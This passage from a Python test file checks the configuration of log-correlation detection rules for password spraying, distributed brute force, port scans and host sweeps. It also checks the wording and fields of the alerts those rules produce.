    assert spray.group_by == ["src_ip"] and spray.distinct_field == "user_name"
    assert spray.threshold == 10 and spray.window == 600 and "T1110.003" in spray.techniques

    dbf = rules["lo-corr-distributed-bruteforce"]
    assert dbf.group_by == ["user_name"] and dbf.distinct_field == "src_ip"
    assert "T1110.004" in dbf.techniques

    ps = rules["lo-corr-port-scan"]
    assert ps.group_by == ["src_ip", "dst_ip"] and ps.distinct_field == "dst_port"

    hs = rules["lo-corr-host-sweep"]
    assert hs.group_by == ["src_ip"] and hs.distinct_field == "dst_ip"
    assert "T1018" in hs.techniques

    # distinct-count alert names the dimension; the group value flows onto the alert
    a = correlation_alert(spray, {"src_ip": "45.1.2.3", "n": 14, "last_seen": None}, bucket=1)
    assert "distinct user_name" in a["message"] and a["src_ip"] == "45.1.2.3"
    assert a["level"] == "high" and "T1110.003" in a["techniques"]

    # an ordinary (non-distinct) correlation rule keeps the classic wording
    bf = rules["lo-corr-bruteforce-logon"]
    assert bf.distinct_field is None
    a2 = correlation_alert(bf, {"src_ip": "1.2.3.4", "n": 6, "last_seen": None}, bucket=1)
    assert "matching events" in a2["message"]
